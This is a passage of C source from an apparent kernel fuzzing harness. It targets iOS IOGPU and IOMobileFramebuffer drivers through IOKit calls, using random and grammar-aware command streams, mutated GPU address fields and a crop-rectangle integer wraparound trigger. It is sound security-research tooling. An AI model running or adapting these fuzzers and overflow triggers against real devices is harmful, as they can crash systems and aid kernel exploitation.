    // T1: segment list = type2 end only (nothing executes)
    memset(vaB, 0, 0x4000);
    *(uint32_t *)(vaB + 0xc) = 0xC0000002;
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;
    *outw = 0xdeadbeef;
    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[s4] T1 type2-end -> kr 0x%08x outw %08x", kt, *outw);
    usleep(200000);

    // T2: segment list with one pair (0,0x10) into command shmem A (zeros)
    memset(vaA, 0, 0x4000);
    memset(vaB, 0, 0x4000);
    *(uint32_t *)(vaB + 0x8) = 1;              // count
    *(uint32_t *)(vaB + 0xc) = 0xC0000001;     // hdr: end|bit30|type1
    *(uint32_t *)(vaB + 0x10) = 0;             // lo
    *(uint32_t *)(vaB + 0x14) = 0x10;          // hi
    *outw = 0xdeadbeef;
    kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[s4] T2 seglist(0,0x10) -> kr 0x%08x outw %08x", kt, *outw);
    usleep(200000);

    // T3: type0 first command (submitCommandBuffer path)
    memset(vaB, 0, 0x4000);
    *(uint32_t *)(vaB + 0xc) = 0x80000000;     // end|type0 at offset 0
    *outw = 0xdeadbeef;
    kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[s4] T3 type0 -> kr 0x%08x outw %08x", kt, *outw);
    LOG("[v54] done (alive)");
}


// V55: fuzz kernel commands in shmem A via segment-list submissions.
static void p_streamfuzz(long rounds) {
    LOG("[v55] kernel command fuzz, %ld rounds", rounds);
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[s5] bind fail"); return; }
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;

    // segment list: one pair covering a command region of A
    *(uint32_t *)(vaB + 0x8) = 1;
    *(uint32_t *)(vaB + 0xc) = 0xC0000001;
    for (long r = 0; r < rounds; r++) {
        // build 1-6 commands in A
        memset(vaA, 0, 0x1000);
        int ncmd = 1 + frand() % 6;
        int off = 0;
        for (int ci = 0; ci < ncmd && off < 0xf00; ci++) {
            int len = (2 + frand() % 14) * 4;       // 8..0x3c, 4-aligned
            *(uint32_t *)(vaA + off + 0x4) = len;
            *(uint32_t *)(vaA + off + 0x0) = (uint32_t)frand();  // type/tag word?
            for (int w = 2; w < len / 4; w++)
                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x1000);
            off += len;
        }
        *(uint32_t *)(vaB + 0x10) = 0;
        *(uint32_t *)(vaB + 0x14) = off;
        *outw = 0xdeadbeef;
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        if (*outw != 0xa && *outw != 9 && *outw != 8 && *outw != 0)
            LOG("[s5] r%ld kr 0x%08x outw %08x", r, k2, *outw);
        if (k2 != 0 && k2 != 0xe00002bc && (r & 0x3f) == 0)
            LOG("[s5] r%ld kr 0x%08x outw %08x", r, k2, *outw);
        if ((r & 0x3ff) == 0) usleep(1000);
    }
    LOG("[v55] done (alive)");
}


// V56: valid-type kernel command fuzz (grammar-aware)
// V123: nq completion watcher for p_streamfuzz2 (env FUZZ_SFW2_WATCH=1).
// The sel14 notification queue (scalars {0x100, 0x10}) is a ring of 0x100
// entries x 0x10 bytes: {u64 value, u32 status, u32 pad} (docs/agx_io_command_path.md,
// sendIOCompletionNotification). We snapshot-diff the ring every 64 rounds:
// a record containing dword 7 (the twice-seen per-entry code 7 anomaly, journal
// part13 §70.2) or any nonzero record deviating from the first-seen template
// is logged as [w7] with hexdump, round and the round's command types.
#define SFW2_NQ_ES 0x10
#define SFW2_NQ_NR 0x100
static void sf2_nq_watch(volatile uint8_t *nq, uint8_t *shadow, long r,
                         const uint32_t *rt, int nrt, int *wlogs,
                         uint8_t *tmpl, int *has_tmpl) {
    for (int s = 0; s < SFW2_NQ_NR; s++) {
        size_t o = (size_t)s * SFW2_NQ_ES;
        uint8_t cur[SFW2_NQ_ES];
        int nz = 0, w7 = 0;
        for (size_t b = 0; b < SFW2_NQ_ES; b++) {
            cur[b] = nq[o + b];
            if (cur[b]) nz = 1;
        }
        if (!nz) { memcpy(shadow + o, cur, SFW2_NQ_ES); continue; }
        if (!*has_tmpl) { memcpy(tmpl, cur, SFW2_NQ_ES); *has_tmpl = 1; }
        for (int w = 0; w < 4; w++) {
            uint32_t v;
            memcpy(&v, cur + w * 4, 4);
            if (v == 7) w7 = 1;
        }
        int dev = memcmp(shadow + o, cur, SFW2_NQ_ES) != 0;
        int unt = *has_tmpl && memcmp(cur, tmpl, SFW2_NQ_ES) != 0;
        if (w7 || (dev && unt)) {
            if (*wlogs < 40)
                LOG("[w7] r%ld slot %d%s: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x | types %x %x %x %x",
                    r, s, w7 ? " CODE7" : " dev",
                    cur[0], cur[1], cur[2], cur[3], cur[4], cur[5], cur[6], cur[7],
                    cur[8], cur[9], cur[10], cur[11], cur[12], cur[13], cur[14], cur[15],
                    nrt > 0 ? rt[0] : 0, nrt > 1 ? rt[1] : 0,
                    nrt > 2 ? rt[2] : 0, nrt > 3 ? rt[3] : 0);
            (*wlogs)++;
        }
        memcpy(shadow + o, cur, SFW2_NQ_ES);
    }
}

static void p_streamfuzz2(long rounds) {
    LOG("[v56] grammar-aware command fuzz, %ld rounds", rounds);
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    uint64_t nqVA = *(uint64_t *)out;   // V123: ring VA for the [w7] watcher
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[s6] bind fail"); return; }
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;

    // events via sel19 (for type 5/6 lookups)
    uint32_t evids[16]; int nev = 0;
    for (int i = 0; i < 16; i++) {
        memset(out, 0, 0x1000);
        uint64_t a19[1] = { 0 };
        osz = 0x18; nosc = 0;
        kr = IOConnectCallMethod(c, 19, a19, 1, NULL, 0, osc, &nosc, out, &osz);
        if (kr == 0) { evids[nev++] = *(uint32_t *)out; }
        else if (i == 0) LOG("[s6] sel19 -> kr 0x%08x", kr);
    }
    LOG("[s6] created %d events", nev);

    // sanity: minimal valid stream (type2 command)
    memset(vaA, 0, 0x4000);
    *(uint32_t *)(vaA + 0x0) = 2;
    *(uint32_t *)(vaA + 0x4) = 0x10;
    memset(vaB, 0, 0x4000);
    *(uint32_t *)(vaB + 0x8) = 1;
    *(uint32_t *)(vaB + 0xc) = 0xC0000001;
    *(uint32_t *)(vaB + 0x10) = 0;
    *(uint32_t *)(vaB + 0x14) = 0x10;
    *outw = 0xdeadbeef;
    kern_return_t k0 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[s6] sanity type2 -> kr 0x%08x outw %08x (expect 0)", k0, *outw);

    // V123: [w7] completion watcher — opt-in via FUZZ_SFW2_WATCH=1
    int watch = getenv("FUZZ_SFW2_WATCH") != NULL;
    volatile uint8_t *nq = (watch && nqVA) ? (volatile uint8_t *)(uintptr_t)nqVA : NULL;
    uint8_t *nqsh = nq ? must_map(SFW2_NQ_ES * SFW2_NQ_NR) : NULL;
    uint8_t nqtmpl[SFW2_NQ_ES];
    int has_tmpl = 0, wlogs = 0;
    if (nq) {
        usleep(2000);   // let the sanity submit's completion land first
        for (size_t b = 0; b < SFW2_NQ_ES * SFW2_NQ_NR; b++) nqsh[b] = nq[b];
        LOG("[w7] watch on, nqVA %llx baseline snapshot taken", nqVA);
    }

    static const uint32_t types[] = { 2,3,4,5,6,8,9,0xa,0xb,0xc,0xd,0xe,0xf,0x10,0x11,0x12,0x10002,0x10004 };
    int unusual = 0;
    uint32_t round_types[8];
    for (long r = 0; r < rounds; r++) {
        memset(vaA, 0, 0x4000);
        int ncmd = 1 + frand() % 4;
        int off = 0;
        int nrt = 0;
        for (int ci = 0; ci < ncmd && off < 0x3800; ci++) {
            uint32_t t = types[frand() % (sizeof(types)/4)];
            if (nrt < 8) round_types[nrt++] = t;
            int minlen = 0x18;
            if (t == 2) minlen = 0x10;
            if (t == 0xf) minlen = 0xb0;
            if (t == 0x11) minlen = 0xc + (frand() % 4) * 0x10;
            if (t == 0x10002) minlen = 0x108;
            if (t == 8) minlen = 4 + (1 + frand() % 8) * 4;
            int len = minlen + (frand() % 3) * 4;
            if (off + len > 0x3f00) break;
            *(uint32_t *)(vaA + off + 0x0) = t;
            *(uint32_t *)(vaA + off + 0x4) = len;
            // id field where applicable
            if (nev && (frand() & 1)) *(uint32_t *)(vaA + off + 0x8) = evids[frand() % nev];
            else *(uint32_t *)(vaA + off + 0x8) = (uint32_t)(frand() % 8);
            for (int w = 3; w < len / 4; w++)
                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
            off += len;
        }
        *(uint32_t *)(vaB + 0x14) = off;
        *outw = 0xdeadbeef;
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        uint32_t ow = *outw;
        if (ow != 0xa && ow != 9 && ow != 8 && ow != 0) {
            if (unusual < 40) LOG("[s5] r%ld kr 0x%08x outw %08x types %x %x %x %x", r, k2, ow,
                nrt>0?round_types[0]:0, nrt>1?round_types[1]:0, nrt>2?round_types[2]:0, nrt>3?round_types[3]:0);
            unusual++;
        }
        if ((r & 0x1ff) == 0) usleep(500);
        if (nq && (r & 63) == 0)
            sf2_nq_watch(nq, nqsh, r, round_types, nrt, &wlogs, nqtmpl, &has_tmpl);
        if (nq && (r % 100000) == 0)
            LOG("[w7] heartbeat r%ld wlogs %d", r, wlogs);
    }
    LOG("[v56] done (alive), unusual %d", unusual);
}


// V57: IOMFB swap_submit crop wraparound (sel4=begin-swap, sel5=submit).
// crop {x:0x7ffffff0, y:0, w:0x80000010, h:1}: x+w wraps to 0 <= surfW.
static void p_iomfb(void) {
    LOG("[v57] IOMFB crop wrap test");
    io_connect_t c = open_service("IOMobileFramebufferAP", 0);
    if (!c) { LOG("[mfb] open failed"); return; }
    IOSurfaceRef surf = make_surface(64, 64);
    if (!surf) return;
    IOSurfaceID sid = IOSurfaceGetID(surf);
    uint8_t *st = must_map(0x1000);
    for (int iter = 0; iter < 8; iter++) {
        // begin-swap
        uint64_t swap_id = 0; uint32_t cnt = 1;
        kern_return_t kr = IOConnectCallScalarMethod(c, 4, NULL, 0, &swap_id, &cnt);
        if (kr || !swap_id) { LOG("[mfb] sel4 -> kr 0x%08x id %llu", kr, swap_id); if (!iter) return; continue; }
        memset(st, 0, 0x6e0);
        *(uint32_t *)(st + 0x98) = (uint32_t)swap_id;    // swap id
        *(uint32_t *)(st + 0x14c) = 1;                    // one layer
        *(uint32_t *)(st + 0x9c) = sid;                   // surface id
        // frame rect {0,0,dispW,dispH} (iPhone 15 Pro Max physical)
        *(uint32_t *)(st + 0x10c) = 0;
        *(uint32_t *)(st + 0x110) = 0;
        *(uint32_t *)(st + 0x114) = 1290;
        *(uint32_t *)(st + 0x118) = 2796;
        // wrapped crop
        *(uint32_t *)(st + 0xac) = 0x7ffffff0;            // x
        *(uint32_t *)(st + 0xb0) = 0;                     // y
        *(uint32_t *)(st + 0xb4) = 0x80000010;            // w (x+w wraps)
        *(uint32_t *)(st + 0xb8) = 1;                     // h
        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
        size_t osz = 0;
        kr = IOConnectCallMethod(c, 5, NULL, 0, st, 0x6e0, osc, &nosc, NULL, &osz);
        LOG("[mfb] sel5 iter %d swap %llu -> kr 0x%08x", iter, swap_id, kr);
        usleep(100000);
    }
    LOG("[v57] done (alive)");
}


// V58: stateful IOGPU command sequences — register object (type 3) then
// reference it (0xb channel submit / 4 remove), per AGX grammar.
static void p_stateful(long rounds) {
    LOG("[v58] stateful command sequences, %ld rounds", rounds);
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) return;
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;
    *(uint32_t *)(vaB + 0x8) = 1;
    *(uint32_t *)(vaB + 0xc) = 0xC0000001;

    static const uint32_t seq_types[] = { 3, 0xb, 4, 0xc, 0xd };
    for (long r = 0; r < rounds; r++) {
        memset(vaA, 0, 0x4000);
        int off = 0;
        // build a stateful sequence: register id X, use id X, remove id X
        uint32_t oid = 1 + frand() % 8;
        int ncmd = 2 + frand() % 4;
        for (int ci = 0; ci < ncmd && off < 0x3800; ci++) {
            uint32_t t = seq_types[frand() % (sizeof(seq_types)/4)];
            int len = 0x18 + (frand() % 4) * 4;
            *(uint32_t *)(vaA + off + 0x0) = t;
            *(uint32_t *)(vaA + off + 0x4) = len;
            *(uint32_t *)(vaA + off + 0x8) = (frand() & 2) ? oid : (uint32_t)(frand() % 12);
            for (int w = 3; w < len / 4; w++)
                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
            off += len;
        }
        *(uint32_t *)(vaB + 0x14) = off;
        *outw = 0xdeadbeef;
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        uint32_t ow = *outw;
        if (ow != 0xa && ow != 9 && ow != 8 && ow != 0)
            LOG("[s8] r%ld kr 0x%08x outw %08x", r, k2, ow);
        if ((r & 0x1ff) == 0) usleep(500);
    }
    LOG("[v58] done (alive)");
}


// V61: AGX inner commands (magic 0x10000, subtype dispatch). Goal: reach
// case handlers (fn_0x831efb0 etc.) where tail qwords -> GPU descriptor.
static void p_agxcmd(void) {
    LOG("[v61] AGX command crafting");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[gx] bind fail"); return; }
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;

    // long fuzz: random tails per subtype; log any code != 0xa (deeper acceptance)
    static const uint32_t subs[] = { 1, 2, 3, 6, 7 };
    long accepted = 0;
    for (long r = 0;; r++) {
        uint32_t sub = subs[frand() % 5];
        uint32_t tailLen = 4 + (frand() % 0x60) * 4;   // 4..0x17c
        memset(vaA, 0, 0x4000);
        uint32_t len = 0xc8 + tailLen;
        *(uint32_t *)(vaA + 0x00) = 0x00010000;
        *(uint32_t *)(vaA + 0x04) = len;
        *(uint32_t *)(vaA + 0xa4) = tailLen;
        *(uint32_t *)(vaA + 0xa8) = sub;
        // semi-structured body (from +0x08, keep +0x8c must-be-zero area clean)
        for (int w = 2; w < 0x21; w++)   // +0x08..+0x8b
            *(uint32_t *)(vaA + w * 4) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x100);
        *(uint32_t *)(vaA + 0x8c) = 0;   // must be zero
        for (uint32_t t = 0; t < tailLen; t += 4)
            *(uint32_t *)(vaA + 0xc8 + t) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
        memset(vaB, 0, 0x4000);
        *(uint32_t *)(vaB + 0x8) = 1;
        *(uint32_t *)(vaB + 0xc) = 0xC0000001;
        *(uint32_t *)(vaB + 0x10) = 0;
        *(uint32_t *)(vaB + 0x14) = len;
        *outw = 0xdeadbeef;
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        uint32_t ow = *outw;
        if (ow != 0xa) {
            LOG("[gx] r%ld subtype %u tailLen 0x%x -> kr 0x%08x outw %08x", r, sub, tailLen, k2, ow);
            accepted++;
        }
        if ((r & 0x3ff) == 0) usleep(1000);
        if (r >= 200000) { LOG("[gx] capped at 200k, accepted %ld", accepted); break; }
        if (r && (r % 500000) == 0) LOG("[gx] r%ld alive, accepted %ld", r, accepted);
    }
}


// V64: full-length tails for subtype 1/2 (accepted by parsers), then mutate
// documented address-qword offsets (verbatim into GPU descriptor).
static void p_agxtail(void) {
    LOG("[v64] AGX tail crafting");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[tl] bind fail"); return; }
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x8000, &vaA);   // bigger: tails up to 0x9a8+0xc8
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;

    // subtype-1 address-bearing qword offsets in tail (from statics)
    static const uint32_t addr_offs[] = { 0x138, 0x140, 0x24c, 0x638 };
    for (long r = 0;; r++) {
        uint32_t sub = (r & 1) ? 2 : 1;
        uint32_t tailLen = (sub == 1) ? 0x9a8 : 0x480;
        memset(vaA, 0, 0x4000);
        uint32_t len = 0xc8 + tailLen;
        *(uint32_t *)(vaA + 0x00) = 0x00010000;
        *(uint32_t *)(vaA + 0x04) = len;
        *(uint32_t *)(vaA + 0xa4) = tailLen;
        *(uint32_t *)(vaA + 0xa8) = sub;
        // mutate one address field per round
        if (r >= 4) {
            uint32_t off = addr_offs[frand() % 4];
            uint64_t val;
            switch (frand() % 4) {
                case 0: val = 0; break;
                case 1: val = frand() % 0x100000; break;                  // small GPUVA
                case 2: val = 0x100000000ULL + (frand() % 0x1000000); break;
                default: val = frand(); break;
            }
            *(uint64_t *)(vaA + 0xc8 + off) = val;
        }
        memset(vaB, 0, 0x4000);
        *(uint32_t *)(vaB + 0x8) = 1;
        *(uint32_t *)(vaB + 0xc) = 0xC0000001;
        *(uint32_t *)(vaB + 0x10) = 0;
        *(uint32_t *)(vaB + 0x14) = len;
        *outw = 0xdeadbeef;
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        uint32_t ow = *outw;
        if (r < 4 || ow != 0xa)
            LOG("[tl] r%ld subtype %u -> kr 0x%08x outw %08x", r, sub, k2, ow);
        if ((r & 0x3ff) == 0) usleep(1000);
        if (r && (r % 200000) == 0) LOG("[tl] r%ld alive", r);
    }
}

